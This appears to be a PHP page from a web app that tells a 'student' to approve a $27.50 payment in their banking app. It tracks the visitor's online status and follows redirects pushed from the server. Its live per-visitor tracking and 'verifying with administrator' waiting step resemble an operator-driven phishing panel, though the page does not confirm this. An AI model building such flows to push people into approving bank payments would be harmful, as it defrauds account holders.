<?php
session_start();
require_once __DIR__ . '/includes/functions.php';
if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'approve');
$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='approve', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve Payment</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:14px;padding:36px;max-width:420px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.06)}

        /* Bank icon animation */
        .bank-icon{
            width:72px;height:72px;border-radius:50%;
            background:linear-gradient(135deg,#1e3a8a,#2563eb);
            display:flex;align-items:center;justify-content:center;
            margin:0 auto 20px;font-size:2rem;color:#fff;
            position:relative;
        }
        .bank-icon::after{
            content:'';position:absolute;inset:-4px;border-radius:50%;
            border:3px solid transparent;border-top-color:#2563eb;
            animation:spinRing 1.5s linear infinite;
        }
        @keyframes spinRing{to{transform:rotate(360deg)}}

        .pulse-dot{
            display:inline-block;width:10px;height:10px;border-radius:50%;
            background:#f59e0b;margin-right:8px;animation:pulseDot 1.2s ease-in-out infinite;
        }
        @keyframes pulseDot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}

        h1{font-size:1.25rem;margin-bottom:8px}
        .waiting-text{color:#64748b;font-size:.88rem;line-height:1.6;margin-bottom:8px}
        .amount{font-size:1.6rem;font-weight:700;color:#1e293b;margin:16px 0}
        .instructions{
            background:#eff6ff;border-radius:10px;padding:16px;margin:20px 0;
            text-align:left;font-size:.84rem;color:#1e40af;line-height:1.7;
        }
        .instructions ol{padding-left:20px}
        .instructions li{margin-bottom:4px}
        .status-bar{
            display:flex;align-items:center;justify-content:center;
            gap:6px;padding:12px;background:#fef3c7;border-radius:10px;
            font-size:.85rem;font-weight:600;color:#92400e;margin-bottom:20px;
        }
        .btn{
            display:block;width:100%;padding:14px;border:none;border-radius:10px;
            font-size:.95rem;font-weight:600;cursor:pointer;font-family:inherit;
            transition:all .15s;
        }
        .btn-approve{background:#16a34a;color:#fff;margin-bottom:10px}
        .btn-approve:hover{background:#15803d}
        .btn-approve:disabled{background:#94a3b8;cursor:not-allowed}
        .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:12px;font-weight:500}
        .alert-success{background:#f0fdf4;color:#16a34a}
    </style>
</head>
<body>
<div class="card">
    <div class="bank-icon">&#127974;</div>
    <h1>Approve in Your Banking App</h1>
    <p class="waiting-text">A payment request of</p>
    <div class="amount">$27.50</div>
    <p class="waiting-text">has been sent to your banking application for approval.</p>

    <div class="instructions">
        <ol>
            <li>Open your banking app on your phone</li>
            <li>Look for the pending payment notification</li>
            <li>Review the amount and approve the transaction</li>
            <li>Come back here and confirm below</li>
        </ol>
    </div>

    <div class="status-bar" id="statusBar">
        <span class="pulse-dot"></span>
        Waiting for approval...
    </div>

    <button class="btn btn-approve" id="approveBtn" onclick="confirmApproval()">I Have Approved</button>
    <div id="msg"></div>
</div>

<script>
const studentId=<?=(int)$student['id']?>;
const visitorId=<?=$visitorId?>;
let pageVisible=true;
let navigatingAway=false;

function confirmApproval() {
    const btn = document.getElementById('approveBtn');
    const bar = document.getElementById('statusBar');
    btn.disabled = true;
    btn.textContent = 'Redirecting...';
    bar.innerHTML = '<span style="color:#16a34a;font-weight:600">&#10004; Approved — redirecting to waiting room...</span>';
    bar.style.background = '#f0fdf4';
    document.getElementById('msg').className = 'alert alert-success';
    document.getElementById('msg').textContent = 'Thank you! Verifying with administrator...';
    navigatingAway = true;
    setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
}

// Heartbeat + redirect check
function hb(){
    if(!pageVisible||document.hidden)return;
    fetch('api/heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({student_id:studentId})})
        .then(r=>r.json()).then(d=>{if(d.redirect){navigatingAway=true;window.location.href=d.redirect}}).catch(()=>{});
    if(visitorId) fetch('api/visitor-heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitor_id:visitorId,status:'approve'})}).catch(()=>{});
}
document.addEventListener('visibilitychange',()=>{
    if(document.hidden){
        pageVisible=false;
        if(!navigatingAway){
            navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));
            if(visitorId) navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));
        }
        clearInterval(t);t=null;
    } else {
        pageVisible=true;hb();if(!t)t=setInterval(hb,5000);
    }
});
function off(){
    if(navigatingAway)return;
    navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));
    if(visitorId) navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));
}
hb();let t=setInterval(hb,5000);
window.addEventListener('pagehide',off);window.addEventListener('beforeunload',off);
</script>
</body>
</html>
